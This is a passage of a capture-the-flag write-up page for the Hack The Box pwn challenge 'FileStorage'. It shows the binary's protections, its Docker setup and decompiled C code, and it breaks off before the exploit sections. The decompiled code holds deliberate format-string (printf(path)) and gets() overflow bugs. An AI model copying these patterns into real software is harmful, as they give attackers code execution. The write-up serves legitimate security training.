<!doctype html><html lang="es"><head><title>FileStorage | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="64-bit binary. Buffer Overflow. Format String vulnerability. FSOP. GOT overwrite"><meta itemprop="description" content="64-bit binary. Buffer Overflow. Format String vulnerability. FSOP. GOT overwrite"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. Format String vulnerability. FSOP. GOT overwrite"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. Format String vulnerability. FSOP. GOT overwrite"><meta property="og:description" content="64-bit binary. Buffer Overflow. Format String vulnerability. FSOP. GOT overwrite"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="FileStorage"><meta property="twitter:title" content="FileStorage"><meta property="og:title" content="FileStorage"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/filestorage/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/&amp;text=FileStorage" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/&amp;title=FileStorage" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">FileStorage</h1><p class="mb4 f6 dib tracked">22 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#finding-vulnerabilities">Finding vulnerabilities</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#fsop">FSOP</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#without-aslr">Without ASLR</a></li><li><a href="#with-aslr">With ASLR</a></li></ul></li><li><a href="#flag">Flag</a></li><li><a href="#unintended-way">Unintended way</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>This challenge was made by me for Hack The Box. We are given a 64-bit binary called <code>file_storage</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><p>We see that it has NX enabled, so we cannot execute custom shellcode on the stack directly. Moreover, it has Partial RELRO, which means that the Global Offset Table (GOT) can be modified in some ways.</p><p>There is no PIE or Stack canaries, so fewer steps to perform the exploitation. Probably, we will only need to bypass ASLR.</p><h2 id="setup-environment">Setup environment</h2><p>We are given a <code>Dockerfile</code>, which will be presumably the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf0907</span><span class="mtk1">5062e937d5653d7d0db0375ad2221</span>
<span class="mtk5">EXPOSE</span><span class="mtk1"> 1337</span>
<span class="mtk5">RUN</span><span class="mtk1"> apt update &amp;&amp; apt install -y socat &amp;&amp; rm -rf /var</span><span class="mtk1">/lib/apt/lists/*</span>  
<span class="mtk5">RUN</span><span class="mtk1"> useradd --user-group --system --no-log-init ctf</span>
<span class="mtk5">USER</span><span class="mtk1"> ctf</span>
<span class="mtk5">WORKDIR</span><span class="mtk1"> /home/ctf</span>
<span class="mtk5">COPY</span><span class="mtk1"> challenge/file_storage challenge/flag.txt ./</span>
<span class="mtk5">ENTRYPOINT</span><span class="mtk1"> [</span><span class="mtk4">"socat"</span><span class="mtk1">, </span><span class="mtk4">"tcp-l:1337,reuseaddr,fork"</span><span class="mtk1">, </span><span class="mtk4">"EXEC:/home/ctf/file_storage"</span><span class="mtk1">]</span>
</code></pre></div><p>So, we can get the remote Glibc library and loader and patch the binary to have the same environment running <code>patchelf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>:/opt"</span> -it ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf09075062e937d5653d7d0db0375ad2221 bash  
root@a7cd55033e42:/# ldd /bin/sh
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x0000004001858000)
	/lib64/ld-linux-x86-64.so.2 (0x0000004000000000)
root@a7cd55033e42:/# cp /lib/x86_64-linux-gnu/libc.so.6 /opt
root@a7cd55033e42:/# cp /lib64/ld-linux-x86-64.so.2 /opt
root@a7cd55033e42:/# exit
exit

<span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> +x <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">libc.so.6</span>

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">file_storage</span>

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">file_storage</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">file_storage</span>
        linux-vdso.so.1 (0x00007ffdfff6e000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007fd0f1249000)
        ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fd0f143d000)

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; ^C
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>Let&rsquo;s decompile the binary using a reversing tool like Ghidra. This is the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">time_t</span><span class="mtk1"> t;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> content[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> path[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> type[</span><span class="mtk6">7</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> filename[</span><span class="mtk6">9</span><span class="mtk1">];</span>
<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">setbuf</span><span class="mtk1">(stdout, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  t </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">time</span><span class="mtk1">((</span><span class="mtk7 mtki">time_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">srand</span><span class="mtk1">((</span><span class="mtk7 mtki">uint</span><span class="mtk1">) t);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome to my File Storage (beta):"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">menu</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Filename: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">fgets</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">      index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strstr</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"txt"</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error: Only </span><span class="mtk6">\'</span><span class="mtk4">.txt</span><span class="mtk6">\'</span><span class="mtk4"> files are allowed"</span><span class="mtk1">);</span>
<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        filename[length] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">sprintf</span><span class="mtk1">(path, </span><span class="mtk4">"/tmp/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, filename </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"r"</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Error: File not found. Please try again</span><span class="mtk6">\n</span><span class="mtk4">Debug: "</span><span class="mtk1">);</span>  
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(path);</span>
<span class="mtk1">          option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What</span><span class="mtk6">\'</span><span class="mtk4">s in the file? (string/number): "</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk8">fgets</span><span class="mtk1">(type ,</span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">          ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"string</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8">__isoc99_fscanf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(content);</span>
<span class="mtk1">          } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">            ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"number</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Error: Bad file content"</span><span class="mtk1">);</span>
<span class="mtk1">              </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">              </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk8">__isoc99_fscanf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">            ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">atoi</span><span class="mtk1">(content);</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret);</span>
<span class="mtk1">          }</span>

<span class="mtk1">          </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk1">          </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Do you want to write something? (yes/no): "</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk8">fgets</span><span class="mtk1">(type, </span><span class="mtk6">8</span><span class="mtk1">, stdin);</span>
<span class="mtk1">          ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(</span><span class="mtk4">"yes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, type);</span>

<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">goto</span><span class="mtk1"> LAB_0040170f;</span>
<span class="mtk1">        }</span>
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
<span class="mtk1">LAB_0040170f:</span>
<span class="mtk1">      </span><span class="mtk8">generate</span><span class="mtk1">(path);</span>
<span class="mtk1">      fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"fopen() error"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter content:"</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">gets</span><span class="mtk1">(content);</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">      </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bye!"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Cleaning files..."</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"rm /tmp/??.txt 2&gt;/dev/null"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Basically, it provides a menu with these few functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined4 </span><span class="mtk8">menu</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined4 local_c;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">1. Read contents from a file"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"2. Write data into a random file"</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"3. Exit"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
